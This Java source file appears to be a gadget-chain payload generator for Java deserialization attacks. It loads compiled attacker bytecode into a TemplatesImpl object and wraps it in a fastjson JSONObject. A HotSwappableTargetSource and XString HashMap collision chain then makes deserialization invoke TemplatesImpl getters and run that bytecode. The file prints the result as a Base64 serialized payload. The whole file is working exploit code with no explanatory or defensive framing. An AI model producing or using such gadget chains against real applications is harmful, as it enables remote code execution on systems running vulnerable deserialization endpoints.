import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;
 
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
 
public class fj_gadget {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();
 
        byte[] bytecodes = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class"));
 
        setValue(templatesimpl,"_name","aaa");
        setValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});
        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());
 
        JSONObject jo = new JSONObject();
        jo.put("1",templatesimpl);
 
        HotSwappableTargetSource h1 = new HotSwappableTargetSource(jo);
//        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("xxx"));
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new Object());
 
        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(h1,h1);
        hashMap.put(h2,h2);
 
        Class clazz=h2.getClass();
        Field transformerdeclaredField = clazz.getDeclaredField("target");
        transformerdeclaredField.setAccessible(true);
        transformerdeclaredField.set(h2,new XString("xxx"));
 
        System.out.println(serial(hashMap));
        //        deserial(payload);
 
    }
 
    public static String serial(Object o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();
 
        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;
 
    }
 
    public static void deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        CustomObjectInputStream ois = new CustomObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
 
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
